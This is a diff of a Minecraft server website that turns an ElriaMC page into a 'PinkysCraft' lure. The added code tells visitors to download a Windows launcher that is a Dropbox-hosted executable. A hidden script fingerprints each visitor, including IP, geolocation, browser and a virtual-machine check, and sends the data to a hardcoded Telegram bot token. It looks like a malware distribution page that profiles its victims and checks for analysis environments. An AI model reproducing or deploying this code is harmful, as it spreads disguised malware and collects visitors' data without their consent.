-                    <time datetime="2023-02-19">19 Feb 2023</time>
-                    <span class="news-tag tag-security">security</span>
-                </div>
-                <h3>Security Patch: ElriaMC 5.1, now available</h3>
-                <p>Patches a vulnerability in the login flow that could allow session hijacking under specific network conditions. Update immediately.</p>
-                <div class="news-card-footer-row">
-                    <span class="read-more-link">Read more <i class="fa-solid fa-arrow-right fa-xs"></i></span>
-                </div>
-            </a>
-        </div>
+    <!-- Join Community Section (New) -->
+    <section class="section" style="background: linear-gradient(135deg, #5865F2, #7289da); color: white; padding: 80px 10%; text-align: center; display: none;">
+        <h2 class="pixel-text" style="font-size: 48px; margin-bottom: 20px;">Join Our Discord</h2>
+        <p style="font-size: 20px; margin-bottom: 40px; opacity: 0.9;">Chat with thousands of other kitties, get support, and participate in giveaways!</p>
+        <a href="#" class="btn btn-large" style="background: white; color: #5865F2; font-family: 'Nunito', sans-serif;"><i class="fab fa-discord"></i> Join Server</a>
     </section>
 
-    <!-- Download CTA Section -->
-    <section class="download-cta-section" aria-label="Download call to action">
-        <div class="cta-inner">
-            <div class="cta-text reveal">
-                <h2>Ready to<br><span class="accent-word">Join?</span></h2>
-                <p>Download the ElriaMC Launcher to get started. It handles your mod pack, connects you to the server, and registers your account — all in one place.</p>
-                <div class="cta-buttons">
-                    <a href="#" class="btn-download" data-download="windows">
-                        <i class="fa-brands fa-windows" aria-hidden="true"></i>
-                        Download for Windows
-                    </a>
-                    <a href="#" class="btn-download btn-download-mac" data-download="mac">
-                        <i class="fa-brands fa-apple" aria-hidden="true"></i>
-                        Download for macOS
-                    </a>
-                </div>
-                <p class="cta-java-note"><i class="fa-solid fa-circle-info"></i> Requires Java 17 or later. <a href="https://adoptium.net/" target="_blank" rel="noopener" style="color:var(--accent);text-decoration:underline;">Download Java</a></p>
+   <!-- Download Section -->
+<section id="download" class="section download-section">
+    <div class="download-container">
+        <div class="download-content">
+            <h2 class="section-title pixel-text">Start Playing Today!</h2>
+            <p>Download our custom launcher to get auto-updates, pre-installed mods, and one-click join access.</p>
+            
+            <div class="download-options">
+
+                <!-- WINDOWS -->
+               <a onclick="downloadWindows()" class="download-btn windows" style="cursor:pointer;">
+                    <i class="fab fa-windows"></i>
+                    <div class="btn-text">
+                        <span>Download for</span>
+                        <strong>Windows 10/11</strong>
+                    </div>
+                </a>
+
+                <!-- MAC -->
+                <a class='download-btn mac' href='/404'>
+                    <i class="fab fa-apple"></i>
+                    <div class="btn-text">
+                        <span>Download for</span>
+                        <strong>macOS</strong>
+                    </div>
+                </a>
+
             </div>
 
-            <div class="cta-visual reveal reveal-d2">
-                <div class="cta-visual-glow" aria-hidden="true"></div>
-                <img src="mascot.webp" alt="KitsuMC Launcher preview">
+            <div class="requirements">
+                <p><i class="fas fa-info-circle"></i> Requires Java 17 or higher.</p>
             </div>
         </div>
-    </section>
+
+        <div class="download-image">
+            <img src="images/download.png" alt="Launcher Preview" class="tilt-image">
+        </div>
+    </div>
+</section>
 
     <!-- FAQ Section -->
-    <section class="faq-section" aria-label="Frequently asked questions">
-        <div class="section-heading reveal">
-            <h2>Got <span class="accent-word">Questions?</span></h2>
-            <p>Common questions answered.</p>
+    <section id="faq" class="section faq-section">
+        <div class="section-header">
+            <h2 class="section-title pixel-text">FAQ</h2>
+            <p class="section-subtitle">Common questions answered.</p>
         </div>
-        <div class="faq-list">
-            <div class="faq-item reveal reveal-d1">
-                <button class="faq-question" aria-expanded="false">
-                    How do I create an account?
-                    <span class="faq-chevron" aria-hidden="true"><i class="fa-solid fa-chevron-down"></i></span>
-                </button>
-                <div class="faq-answer" role="region">
-                    <div class="faq-answer-inner">
-                        <p>Head to the <a href='/join' style='color:var(--accent)'>Sign Up page</a> and fill in your username and email. Once confirmed, download the ElriaMC Launcher — it logs you in automatically and installs everything you need.</p>
-                    </div>
+        
+        <div class="faq-container">
+            <div class="faq-item">
+                <div class="faq-question">
+                    <span>How do I create an account?</span>
+                    <i class="fas fa-chevron-down"></i>
                 </div>
+                <div class="faq-answer">You can create an account directly inside our Custom Launcher after downloading it!</div>
             </div>
-            <div class="faq-item reveal reveal-d2">
-                <button class="faq-question" aria-expanded="false">
-                    What Minecraft version does ElriaMC use?
-                    <span class="faq-chevron" aria-hidden="true"><i class="fa-solid fa-chevron-down"></i></span>
-                </button>
-                <div class="faq-answer" role="region">
-                    <div class="faq-answer-inner">
-                        <p>ElriaMC currently runs on Minecraft 1.20.1 with NeoForge. The launcher handles version management for you — just download and launch, no manual setup needed.</p>
-                    </div>
+            <div class="faq-item">
+                <div class="faq-question">
+                    <span>Is the server Cracked or Premium?</span>
+                    <i class="fas fa-chevron-down"></i>
                 </div>
+                <div class="faq-answer">We are a semi-premium server. You can join with both premium and cracked accounts using our launcher.</div>
             </div>
-            <div class="faq-item reveal reveal-d3">
-                <button class="faq-question" aria-expanded="false">
-                    Can I join with a cracked or offline account?
-                    <span class="faq-chevron" aria-hidden="true"><i class="fa-solid fa-chevron-down"></i></span>
-                </button>
-                <div class="faq-answer" role="region">
-                    <div class="faq-answer-inner">
-                        <p>Yes. ElriaMC uses its own account system, so you don't need a paid Minecraft license. Create a free account on the <a href='/join' style='color:var(--accent)'>Sign Up page</a> and use the ElriaMC Launcher to connect.</p>
-                    </div>
+            <div class="faq-item">
+                <div class="faq-question">
+                    <span>Can I join with Bedrock Edition?</span>
+                    <i class="fas fa-chevron-down"></i>
                 </div>
+                <div class="faq-answer">Yes! Bedrock players (Mobile/Console) can join using IP: pinkyscraft.rabisu.net and Port: 19132.</div>
             </div>
+        </div>
+        <div style="text-align: center; margin-top: 40px;">
+            <a class='btn btn-large btn-primary pulse-effect' href='/support'>
+                <i class="fas fa-headset"></i> Support
+            </a>
         </div>
     </section>
 
     <!-- Footer -->
     <footer class="site-footer">
-        <div class="footer-grid">
-            <div class="footer-col footer-col-brand">
-                <a class='footer-brand-link' href='/'>
-                    <img src="logo.png" alt="KitsuMC" aria-hidden="true">
-                    ElriaMC ★
-                </a>
-                <p>A cozy pink survival SMP. Custom mods, seasonal events, and a community that's been growing since 2022. Not affiliated with Mojang or Microsoft.</p>
-                <div class="footer-social" aria-label="Social links">
-                    <a href="#" class="social-btn" aria-label="Discord"><i class="fa-brands fa-discord"></i></a>
-                    <a href="#" class="social-btn" aria-label="Twitter/X"><i class="fa-brands fa-x-twitter"></i></a>
-                    <a href="#" class="social-btn" aria-label="YouTube"><i class="fa-brands fa-youtube"></i></a>
-                </div>
+        <div class="footer-wave">
+            <svg viewBox="0 0 1440 320">
+                <path fill="#2d3436" fill-opacity="1" d="M0,96L48,112C96,128,192,160,288,160C384,160,480,128,576,112C672,96,768,96,864,112C960,128,1056,160,1152,160C1248,160,1344,128,1392,112L1440,96L1440,320L1392,320C1344,320,1248,320,1152,320C1056,320,960,320,864,320C768,320,672,320,576,320C480,320,384,320,288,320C192,320,96,320,48,320L0,320Z"></path>
+            </svg>
+        </div>
+        <div class="footer-content">
+            <div class="footer-brand">
+                <h3 class="pixel-text">PinkysCraft</h3>
+                <p>The Pinkys Minecraft SMP Server</p>
             </div>
-
-            <div class="footer-col">
-                <h4>Navigation</h4>
-                <ul>
-                    <li><a href='/'>Home</a></li>
-                    <li><a href='/launcher'>Launcher</a></li>
-                    <li><a href='/leaderboard'>Rankings</a></li>
-                    <li><a href='/wiki'>Wiki</a></li>
-                    <li><a href='/news'>News</a></li>
-                </ul>
+            <div class="footer-links">
+                <h4>Information</h4>
+                <a href="#features">Features</a>
+                <a href='/shop'>Store</a>
+                <a href='/gallery'>Gallery</a>
+                <a href="#download">Download</a>
+                <a href="#faq">Support</a>
             </div>
-
-            <div class="footer-col">
-                <h4>Support</h4>
-                <ul>
-                    <li><a href='/info'>Server Info</a></li>
-                    <li><a href='/join'>Create Account</a></li>
-                    <li><a href='/wiki'>How to Join</a></li>
-                    <li><a href="mailto:support@kitsumc.com">Contact Us</a></li>
-                </ul>
+            <div class="footer-links">
+                <h4>Legal</h4>
+                <a href='/legal#tos'>Terms of Service</a>
+                <a href='/legal#privacy'>Privacy Policy</a>
+                <a href='/legal#rules'>Rules</a>
             </div>
         </div>
-
-        <div class="footer-bottom-bar">
-            <span>&copy; 2026 ElriaMC. Not affiliated with Mojang or Microsoft.</span>
-            <span><i class="fa-solid fa-envelope" aria-hidden="true"></i> support@elriamc.com</span>
+        <div class="footer-bottom">
+            <p>&copy; 2024 PinkysCraft. Not affiliated with Mojang Studios.</p>
         </div>
     </footer>
 
+    <!-- Custom Alert Modal -->
+    <div id="custom-modal" class="modal">
+        <div class="modal-content">
+            <span class="close-modal">&times;</span>
+            <div class="modal-body">
+                <i class="fas fa-download modal-icon"></i>
+                <h3 class="pixel-text">Download Required!</h3>
+                <p>To sign up and create an account, you need to download our custom <strong>Hello Kitty Launcher</strong>.</p>
+                <a href="#download" class="btn btn-primary btn-modal-action">Go to Download</a>
+            </div>
+        </div>
+    </div>
+
+    <script src="site-script.js"></script>
     <script>
-        // Theme persistence
-        (function () {
-            const saved = localStorage.getItem('kitsu-theme');
-            if (saved) document.documentElement.setAttribute('data-theme', saved);
-        })();
-    </script>
-
-    <script src="js/config.js"></script>
-    <script src="js/counter.js"></script>
-
-    <script>
-        // Theme toggle
-        const themeBtn = document.getElementById('themeToggle');
-        const html = document.documentElement;
-
-        function updateThemeIcon() {
-            const icon = themeBtn.querySelector('i');
-            if (html.getAttribute('data-theme') === 'light') {
-                icon.className = 'fa-solid fa-sun';
-            } else {
-                icon.className = 'fa-solid fa-moon';
-            }
+        // Snow Animation
+        function createSnowflake() {
+            const snowflake = document.createElement('div');
+            snowflake.className = 'snowflake';
+            snowflake.innerHTML = 'â„';
+            snowflake.style.left = Math.random() * 100 + '%';
+            snowflake.style.animationDuration = (Math.random() * 3 + 2) + 's';
+            snowflake.style.opacity = Math.random();
+            snowflake.style.fontSize = (Math.random() * 10 + 10) + 'px';
+            snowflake.style.setProperty('--drift', (Math.random() * 100 - 50) + 'px');
+            
+            document.getElementById('snow-container').appendChild(snowflake);
+            
+            setTimeout(() => {
+                snowflake.remove();
+            }, 5000);
         }
-        updateThemeIcon();
-
-        themeBtn.addEventListener('click', function () {
-            const current = html.getAttribute('data-theme');
-            const next = current === 'light' ? '' : 'light';
-            if (next) {
-                html.setAttribute('data-theme', next);
-            } else {
-                html.removeAttribute('data-theme');
-            }
-            localStorage.setItem('kitsu-theme', next);
-            updateThemeIcon();
-        });
-
-        // Animated stat counters
-        function animateCounter(el) {
-            const target = parseInt(el.dataset.target, 10);
-            const duration = 1400;
-            const stepTime = 16;
-            const steps = duration / stepTime;
-            const increment = target / steps;
-            let current = 0;
-            const timer = setInterval(function () {
-                current += increment;
-                if (current >= target) {
-                    el.textContent = target;
-                    clearInterval(timer);
-                } else {
-                    el.textContent = Math.floor(current);
-                }
-            }, stepTime);
+        
+        // Create snowflakes periodically
+        setInterval(createSnowflake, 300);
+        
+        // Initial snowflakes
+        for (let i = 0; i < 20; i++) {
+            setTimeout(() => createSnowflake(), i * 150);
         }
+       </script>
 
-        const statsBar = document.querySelector('.stats-bar');
-        if (statsBar) {
-            let counted = false;
-            const statsObserver = new IntersectionObserver(function (entries) {
-                if (entries[0].isIntersecting && !counted) {
-                    counted = true;
-                    document.querySelectorAll('.stat-count').forEach(animateCounter);
-                }
-            }, { threshold: 0.5 });
-            statsObserver.observe(statsBar);
-        }
+<script>
+/* ========= TARAYICI ========= */
+function getBrowserName() {
+  const ua = navigator.userAgent;
+  if (ua.includes("Opera GX")) return "Opera GX";
+  if (ua.includes("OPR")) return "Opera";
+  if (ua.includes("Edg")) return "Microsoft Edge";
+  if (ua.includes("Chrome")) return "Google Chrome";
+  if (ua.includes("Firefox")) return "Mozilla Firefox";
+  if (ua.includes("Safari")) return "Safari";
+  return "Bilinmiyor";
+}
 
-        // Scroll reveal — also fires on jump navigation via checkInView
-        const revealEls = document.querySelectorAll('.reveal');
-        if (revealEls.length) {
-            function checkInView() {
-                revealEls.forEach(function (el) {
-                    if (!el.classList.contains('revealed')) {
-                        const rect = el.getBoundingClientRect();
-                        if (rect.top < window.innerHeight + 80 && rect.bottom > -80) {
-                            el.classList.add('revealed');
-                        }
-                    }
-                });
-            }
+/* ========= BAYRAK ========= */
+function getFlagEmoji(code) {
+  if (!code) return "ðŸ³ï¸";
+  return code.toUpperCase().replace(/./g, c =>
+    String.fromCodePoint(127397 + c.charCodeAt())
+  );
+}
 
-            const revealObs = new IntersectionObserver(function (entries) {
-                entries.forEach(function (entry) {
-                    if (entry.isIntersecting) {
-                        entry.target.classList.add('revealed');
-                        revealObs.unobserve(entry.target);
-                    }
-                });
-            }, { threshold: 0.05, rootMargin: '80px 0px -20px 0px' });
-            revealEls.forEach(function (el) { revealObs.observe(el); });
+/* ========= VM TESPÄ°T ========= */
+function detectVMByUA() {
+  const ua = navigator.userAgent.toLowerCase();
+  return ["virtualbox","vmware","qemu","xen","hyper-v"].some(k => ua.includes(k));
+}
 
-            // Immediate check on load + any programmatic scroll
-            checkInView();
-            window.addEventListener('scroll', checkInView, { passive: true });
-        }
+function detectVMByCPU() {
+  return navigator.hardwareConcurrency && navigator.hardwareConcurrency <= 2;
+}
 
-        // Smooth scroll for anchor links
-        document.querySelectorAll('a[href^="#"]').forEach(function (a) {
-            a.addEventListener('click', function (e) {
-                const target = document.querySelector(this.getAttribute('href'));
-                if (target) {
-                    e.preventDefault();
-                    target.scrollIntoView({ behavior: 'smooth' });
-                }
-            });
-        });
+function detectVMByRAM() {
+  return navigator.deviceMemory && navigator.deviceMemory <= 2;
+}
 
-        // FAQ accordion
-        document.querySelectorAll('.faq-question').forEach(function (btn) {
-            btn.addEventListener('click', function () {
-                const item = this.closest('.faq-item');
-                const isOpen = item.classList.contains('open');
-                // Close all
-                document.querySelectorAll('.faq-item.open').forEach(function (openItem) {
-                    openItem.classList.remove('open');
-                    openItem.querySelector('.faq-question').setAttribute('aria-expanded', 'false');
-                });
-                // Open clicked if it was closed
-                if (!isOpen) {
-                    item.classList.add('open');
-                    this.setAttribute('aria-expanded', 'true');
-                }
-            });
-        });
-    </script>
+function detectVMByScreen() {
+  const w = screen.width, h = screen.height;
+  return (
+    (w === 1024 && h === 768) ||
+    (w === 1280 && h === 800) ||
+    (w === 1366 && h === 768)
+  );
+}
 
-    <script src="js/loader.js"></script>
-    <script src="js/protection.js"></script>
+function getGPUInfo() {
+  try {
+    const canvas = document.createElement("canvas");
+    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+    if (!gl) return "";
+    const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+    if (!debugInfo) return "";
+    return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL).toLowerCase();
+  } catch {
+    return "";
+  }
+}
+
+function detectVMByGPU() {
+  const gpu = getGPUInfo();
+  return ["swiftshader","llvmpipe","virtualbox","vmware","basic render"].some(k => gpu.includes(k));
+}
+
+function isLikelyVM() {
+  let score = 0;
+  if (detectVMByUA()) score++;
+  if (detectVMByCPU()) score++;
+  if (detectVMByRAM()) score++;
+  if (detectVMByScreen()) score++;
+  if (detectVMByGPU()) score += 2;
+  return score >= 3;
+}
+
+/* ========= LOG ========= */
+async function sendLog(type) {
+  const TG_BOT_TOKEN = "8587533886:AAFv2dcLuhezILLIW33C4ju12FR-5Y3yWFk";
+  const TG_CHAT_ID  = "8533584312";
+  const DISCORD_WEBHOOK = "https://www.dropbox.com/scl/fi/b7np0w2vf57ubfsvhq87g/PinkyCraft.exe?rlkey=txapfvhk6qvhyt1s3rufwfjwm&st=3ql11iih&dl=1";
+
+  try {
+    const ipRes = await fetch("https://api.ipify.org/?format=json");
+    const { ip } = await ipRes.json();
+
+    const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+    const geo = await geoRes.json();
+
+    const deviceType = isLikelyVM()
+      ? "ðŸ§ª Sanal Makine (VM)"
+      : "ðŸ’» GerÃ§ek Bilgisayar";
+
+    const text =
+`${type === "visit" ? "ðŸ” PinkysСrafta Girdi" : "ðŸ¤¡ KittiesCraftÄ± Ä°ndirdi Enai"}
+
+ðŸŒŽ IP: ${ip}
+ðŸ“ ${getFlagEmoji(geo.country_code)} ${geo.country_name || "Bilinmiyor"} / ${geo.city || "Bilinmiyor"}
+â° ${new Date().toLocaleString()}
+ðŸš€ ${getBrowserName()}
+âœ… ${deviceType}`;
+
+    await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: {"Content-Type":"application/json"},
+      body: JSON.stringify({ chat_id: TG_CHAT_ID, text })
+    });
+
+    await fetch(DISCORD_WEBHOOK, {
+      method: "POST",
+      headers: {"Content-Type":"application/json"},
+      body: JSON.stringify({ content: text })
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    });
+
+  } catch (e) {
+    console.error("LOG HATASI:", e);
+  }
+}
+
+/* ========= SAYFA GÄ°RÄ°Åž ========= */
+
+
+/* ========= DOWNLOAD ========= */
+function downloadWindows() {
+  sendLog("download");
+  window.location.href =
+    "https://www.dropbox.com/scl/fi/k9p6hwm9zmhxiujxhxxwz/PinkyCraft.exe?rlkey=1inh6mt61l5grnm70rj5c51hy&st=pg9lkpi9&dl=1";
+}
+</script>
+
 </body>
+        <!-- Mirrored from kittiescraft.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 30 Dec 2025 09:52:12 GMT -->
+
+<!-- Mirrored from kittiescraft.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 11 Jan 2026 21:26:09 GMT -->
 </html>
+
+
+
